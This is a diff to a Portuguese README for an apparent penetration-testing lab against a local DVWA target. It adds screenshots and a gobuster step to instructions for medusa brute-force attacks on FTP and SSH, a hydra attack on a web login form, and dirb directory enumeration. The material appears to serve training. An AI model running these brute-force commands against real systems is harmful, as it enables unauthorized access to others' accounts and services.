@@ -31,7 +31,8 @@ Usando o comando:
 
 Será feito o scan e o resultado salvo em um arquivo de texto com o nome scan.txt.
 
-[Foto scan nmap]
+<img width="1513" height="760" alt="01 scannmap" src="https://github.com/user-attachments/assets/c357073c-7510-4f02-bd83-eedf36fbd097" />
+
 
 Podemos verificar que ha vários serviços rodando e iremos realizar ataques em alguns deles como: ftp e ssh.
 
@@ -54,15 +55,17 @@ para sistema MAC use o comando:
 
 Usando uma wordlist de usuarios e uma wordlist de senhas faremos o ataque no serviço FTP com o comando:
 
-`medusa -h [IP DO ALVO] -U [WORDLIST USUARIOS] -P [WORDLIST SENHAS] -X [SERVIÇO] -t[QTD THEADS]`
+`medusa -h [IP DO ALVO] -U [WORDLIST USUARIOS] -P [WORDLIST SENHAS] -M ftp -t[QTD THREADS]`
 
 Nesse cenário fizemos um brute force no serviço de FTP usando wordlists de usuários e senhas e 6 threads.
 
-[foto ataque ftp medusa]
+<img width="1905" height="983" alt="02 bruteftp" src="https://github.com/user-attachments/assets/3c54ce00-1cf6-4119-ac9f-622270626a04" />
+
 
 com o resultado de sucesso podemos testar e validar o acesso logando no serviço.
 
-[foto login ftp]
+<img width="1131" height="982" alt="03 sectionftp" src="https://github.com/user-attachments/assets/55b1a0c4-709c-4deb-8237-a479c2c9d590" />
+
 
 ----
 
@@ -70,9 +73,10 @@ com o resultado de sucesso podemos testar e validar o acesso logando no serviço
 
 Para o brute force  ssh podemos usar o comando:
 
-`medusa -h [IP ALVO] -M ssh -U [WORDLIST USERS] -P [WORDLIST ] -t 6`
+`medusa -h [IP ALVO] -M ssh -U [WORDLIST USERS] -P [WORDLIST ] -t [QTD THREADS]`
 
-[foto ataque ssh]
+<img width="1903" height="978" alt="04 brutessh" src="https://github.com/user-attachments/assets/7e052014-5d66-4428-a8ea-5923ae85152e" />
+
 
 ----
 
@@ -93,7 +97,13 @@ usaremos o DIRB para enumerar mas tambem poderiamos usar o GOBUSTER
 
 `dirb http://[IP DO ALVO]`
 
-[foto enumeração dirb]
+<img width="1021" height="714" alt="05 dirbscan" src="https://github.com/user-attachments/assets/2cf1f187-7d4f-4d8d-80e3-836459adbf73" />
+
+**ENUMERANDO DIRETÓRIOS COM O GOBUSTER**
+
+gobuster dir -u http://192.168.0.17 -w /usr/share/dirb/wordlists/common.txt
+
+<img width="1422" height="738" alt="06 gobusterscan" src="https://github.com/user-attachments/assets/e99b1a2a-f30d-40ba-a2ca-50a374712fee" />
 
 ----
 
@@ -109,7 +119,8 @@ para tal cenário usaremos o comando:
 
 `hydra [IP ALVO] -L [WORDLIST USER] -P [WORDLIST PASS] http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"`
 
-[foto ataque]
+<img width="1907" height="388" alt="image" src="https://github.com/user-attachments/assets/088b6f1d-6f75-42b2-bce3-d3d74646d473" />
+
 
 Validando o retorno do ataque:
 
